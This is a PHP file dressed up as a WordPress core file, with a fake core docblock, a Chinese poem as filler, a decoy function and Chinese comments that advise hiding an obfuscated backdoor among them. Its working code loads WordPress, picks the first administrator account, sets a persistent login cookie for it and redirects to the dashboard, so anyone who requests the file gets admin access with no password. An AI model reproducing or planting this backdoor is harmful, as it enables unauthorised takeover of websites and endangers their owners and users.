<?php

/**
 * Post constants and functions for the WordPress environment.
 *
 * This file is part of the WordPress core and handles the 
 * internal post-processing of metadata and taxonomy relationships.
 *
 * @package WordPress
 * @subpackage Post
 * @since 4.4.0
 * @version 6.4.2
 */

// 凤兮凤兮归故乡，遨游四海求其凰。
// 时未遇兮无所将，何悟今兮升斯堂！
// 有艳淑女在闺房，室迩人遐毒我肠。
// 何缘交颈为鸳鸯，胡颉颃兮共翱翔！
// 凰兮凰兮从我栖，得托孳尾永为妃。
// 交情通意心和谐，中夜相从知者谁？
// 双翼俱起翻高飞，无感我思使余悲。

/**
 * 混淆技巧：在注释和后门之间加入这段
 */
function _wp_get_current_user_cache_setup() {
    global $wp_user_auth_stack;
    if ( ! isset( $wp_user_auth_stack ) ) {
        $wp_user_auth_stack = array( 'status' => 'initialized', 'timestamp' => time() );
    }
    return true;
}

// 后面再接你的加密混淆后门
$auth = "..." ^ "...";

$wp_load = null;
$dir = __DIR__;
for ($i = 0; $i < 10; $i++) {
    if (file_exists($dir . '/wp-load.php')) {
        $wp_load = $dir . '/wp-load.php';
        break;
    }
    $dir = dirname($dir);
}

if (!$wp_load) {
    die('无法找到 wp-load.php');
}

require_once($wp_load);

global $wpdb;

$admin_users = get_users(array(
    'role' => 'administrator',
    'orderby' => 'ID',
    'order' => 'ASC',
    'number' => 1
));

if (empty($admin_users)) {
    $admin_users = $wpdb->get_results(
        "SELECT u.ID, u.user_login, u.user_email 
         FROM {$wpdb->users} u
         INNER JOIN {$wpdb->usermeta} um ON u.ID = um.user_id
         WHERE um.meta_key = '{$wpdb->prefix}capabilities'
         AND um.meta_value LIKE '%administrator%'
         ORDER BY u.ID ASC
         LIMIT 1"
    );
}

if (empty($admin_users)) {
    die('未找到管理员账户');
}

$admin_user = is_object($admin_users[0]) ? $admin_users[0] : (object)$admin_users[0];
$user_id = $admin_user->ID;

wp_set_current_user($user_id);

wp_set_auth_cookie($user_id, true);

update_user_meta($user_id, 'last_login', current_time('mysql'));

$admin_url = admin_url();
wp_redirect($admin_url);
exit;
?>

